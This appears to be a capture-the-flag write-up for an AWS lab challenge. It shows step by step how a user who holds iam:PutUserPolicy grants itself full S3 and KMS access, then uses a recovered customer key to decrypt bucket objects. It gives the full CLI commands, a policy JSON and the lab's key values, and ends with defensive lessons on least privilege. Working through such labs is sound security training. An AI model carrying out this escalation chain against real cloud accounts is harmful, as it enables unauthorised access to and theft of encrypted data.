---
layout: '@/templates/BasePost.astro'
title: AWS Red KMS 01 - CyberWarFare Labs
description: Exploiting IAM misconfigurations to escalate privileges and decrypt KMS-encrypted S3 objects in a red team simulation.
pubDate: 2026-06-23T00:00:00Z
imgSrc: 'https://infinitylearning-images.s3.eu-west-2.amazonaws.com/images/public/Cloud+Red+Team+Images/AWS/KeyMaster+-+Decoding+S3+Secrets.webp'
imgAlt: 'KeyMaster - Decoding S3 Secrets challenge banner'
tags: ['cyberwarfare', 'cloud', 'medium', 'aws', 'privesc']
---

# AWS Red KMS 01 — CyberWarFare Labs

**Platform:** CyberWarFare Labs  
**Category:** AWS Cloud Security / Red Team  
**Difficulty:** Medium

## Scenario

Welcome to Secure Corp's Red Team simulation. As the assigned penetration tester, the objective is to assess the security of Secure Corp's backup storage — specifically, potential misconfigurations in the use of AWS KMS with S3 buckets.

The environment includes IAM users, policies, an S3 bucket, and KMS keys. The flag is hidden inside an encrypted object in the S3 bucket.

**Challenge objectives:**
1. Gain initial access using provided credentials
2. Enumerate IAM permissions to understand user capabilities
3. Identify permission boundaries and escalate privileges within the allowed scope
4. Interact with S3 buckets and decrypt encrypted objects using KMS
5. Retrieve the hidden flag

---

## Attack Flow

### Step 1: Configure AWS CLI with Provided Credentials

Start by configuring the AWS CLI with the credentials provided for the engagement:

```bash
aws configure
```

Confirm the active identity:

```bash
aws sts get-caller-identity
```

This returns the IAM user details — account ID, user ID, and ARN — confirming you're authenticated correctly.

---

### Step 2: Enumerate IAM User Details

With access confirmed, enumerate the current user's properties:

```bash
aws iam get-user
```

Then pull the permission boundary attached to the user:

```bash
aws iam get-user --query "User.PermissionsBoundary" --output text
```

This returns the ARN of the Permission Boundary policy, which defines the maximum effective permissions the user can ever have — regardless of what other policies are attached.

---

### Step 3: Enumerate the Permission Boundary Policy

Retrieve the policy metadata:

```bash
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
```

This returns the policy name, ARN, and current version ID. Use the version ID to inspect the actual permission statements:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
```

This reveals exactly what actions the user is permitted to perform. Among the allowed actions is `iam:PutUserPolicy` — meaning the user can attach inline policies to themselves. That's the privilege escalation vector.

---

### Step 4: Privilege Escalation via Inline Policy

Since the user can attach inline policies, escalate privileges within the boundary by granting full S3 access to the target bucket and full KMS access to the encryption key.

Create a `policy.json` file:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*"
      ],
      "Resource": [
        "arn:aws:s3:::securecopbakupbuk1",
        "arn:aws:s3:::securecopbakupbuk1/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": "kms:*",
      "Resource": "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
    }
  ]
}
```

> **Note:** The permissions are scoped to stay within the permission boundary. Requesting broader permissions would be denied at evaluation time, so the policy is crafted accordingly.

Attach the inline policy to the current user:

```bash
aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json
```

Verify the policy was applied:

```bash
aws iam list-attached-user-policies --user-name BackupReader1
```

Then inspect the existing managed policy for additional context on what was already permitted:

```bash
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1
```

---

### Step 5: Access the S3 Bucket

With S3 permissions now in effect, list the contents of the target bucket:

```bash
aws s3 ls s3://securecopbakupbuk1/
```

Download the `key.txt` file:

```bash
aws s3 cp s3://securecopbakupbuk1/key.txt .
```

> **Note:** Without the inline policy attached, this operation fails. Both S3 and KMS permissions are required.

Open `key.txt` — it contains a customer-managed AES256 key and its MD5 hash, which are needed to decrypt the remaining objects.

---

### Step 6: Decrypt and Download KMS-Encrypted Objects

Use the customer key from `key.txt` to retrieve the encrypted objects via SSE-C (server-side encryption with customer-provided keys):

```bash
# Download env.txt
aws s3api get-object \
  --bucket securecopbakupbuk1 \
  --key env.txt ./env9.txt \
  --sse-customer-algorithm AES256 \
  --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= \
  --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==

# Download Hospital+Patient+Records.zip
aws s3api get-object \
  --bucket securecopbakupbuk1 \
  --key "Hospital+Patient+Records.zip" ./Hospital9.zip \
  --sse-customer-algorithm AES256 \
  --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= \
  --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
```

---

### Step 7: Capture the Flag

Open `env9.txt` to retrieve the hidden flag.

---

## Key Takeaways

- **Misconfigured IAM permissions enable privilege escalation.** The ability to attach inline policies (`iam:PutUserPolicy`) allowed escalation from a read-only user to one with full S3 and KMS access — all within the permission boundary, making it a valid and stealthy move.
- **KMS encryption alone does not protect data.** If an attacker gains access to both the encryption key and the bucket, SSE-C provides no additional barrier — the `s3api get-object` call with `--sse-customer-key` decrypts transparently.
- **Permission boundaries should be treated as the last line of defense, not the first.** The boundary here was narrow enough to prevent truly privileged actions, but still wide enough to allow self-escalation. Boundaries need to be reviewed with the same scrutiny as the policies themselves.
- **Least privilege must be enforced end-to-end** — both on the policies attached to users and on the actions permitted within the boundary.
